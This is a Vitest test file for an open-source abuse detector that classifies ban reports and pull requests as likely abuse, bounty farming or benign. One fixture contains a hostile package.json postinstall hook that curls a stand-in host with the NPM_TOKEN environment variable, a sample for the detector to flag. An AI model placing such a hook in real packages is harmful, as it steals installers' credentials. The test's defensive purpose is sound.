import { describe, expect, it, vi } from "vitest";

const loadValidation = () => {
	vi.resetModules();
	vi.stubEnv("OPENROUTER_API_KEY", "");
	return import("./validation");
};

describe("validateReportWithOpenRouter", () => {
	it("keeps severe command-only reports in review", async () => {
		const { validateReportWithOpenRouter } = await loadValidation();

		const result = await validateReportWithOpenRouter({
			commandText: "ban this user reason: malicious code attempt",
			pullRequest: {
				body: "Production smoke test fixture.",
				title: "OSS Protector production smoke test",
				url: "https://github.com/lord007tn/oss-protector-e2e/pull/12",
			},
			reasonText: "ban this user reason: malicious code attempt",
			reporterAssociation: "OWNER",
			reporterIsMaintainer: true,
			targetLogin: "lord007tn",
		});

		expect(result.status).toBe("needs_review");
		expect(result.verdict).toBe("unclear");
		expect(result.confidence).toBeLessThanOrEqual(64);
	});

	it("allows validation when pull request context corroborates the report", async () => {
		const { validateReportWithOpenRouter } = await loadValidation();

		const result = await validateReportWithOpenRouter({
			commandText: "ban this user reason: malicious code attempt",
			pullRequest: {
				body: "Patch adds a base64 encoded backdoor and token exfiltration.",
				title: "Suspicious credential handling",
				url: "https://github.com/lord007tn/oss-protector-e2e/pull/12",
			},
			reasonText: "ban this user reason: malicious code attempt",
			reporterAssociation: "OWNER",
			reporterIsMaintainer: true,
			targetLogin: "lord007tn",
		});

		expect(result.status).toBe("validated");
		expect(result.verdict).toBe("likely_abuse");
	});
});

describe("validatePullRequestWithOpenRouter", () => {
	it("flags concrete malicious lifecycle and credential exfiltration signals", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Adds install helper.",
			files: [
				{
					additions: 5,
					changes: 5,
					deletions: 0,
					filename: "package.json",
					patch:
						'+ "postinstall": "node -e \\"require(\'child_process\').exec(\'curl https://example.test?token=\'+process.env.NPM_TOKEN)\\""',
					status: "modified",
				},
			],
			targetLogin: "suspicious-user",
			title: "Improve install flow",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/20",
		});

		expect(result.verdict).toBe("likely_abuse");
		expect(result.reasonCode).toBe("malicious_code");
		expect(result.confidence).toBeGreaterThanOrEqual(75);
		expect(result.scoreBreakdown?.maliciousRisk).toBeGreaterThanOrEqual(80);
	});

	it("keeps low-value bounty farming as review-needed instead of validated abuse", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Claiming bounty contribution for this quick update.",
			files: [
				{
					additions: 1,
					changes: 1,
					deletions: 0,
					filename: "README.md",
					patch: "+ Minor update",
					status: "modified",
				},
			],
			targetLogin: "farming-user",
			title: "Small contribution for reward",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/21",
		});

		expect(result.verdict).toBe("unclear");
		expect(result.reasonCode).toBe("fake_bounty");
		expect(result.scoreBreakdown?.farmingRisk).toBeGreaterThanOrEqual(60);
	});

	it("does not flag a scoped useful typo fix", async () => {
		const { validatePullRequestWithOpenRouter } = await loadValidation();

		const result = await validatePullRequestWithOpenRouter({
			body: "Fixes a typo in the setup docs.",
			files: [
				{
					additions: 1,
					changes: 2,
					deletions: 1,
					filename: "README.md",
					patch: "- instal\n+ install",
					status: "modified",
				},
			],
			targetLogin: "helpful-user",
			title: "Fix typo in README",
			url: "https://github.com/lord007tn/oss-protector-e2e/pull/22",
		});

		expect(result.verdict).toBe("not_enough_evidence");
		expect(result.confidence).toBe(0);
	});
});
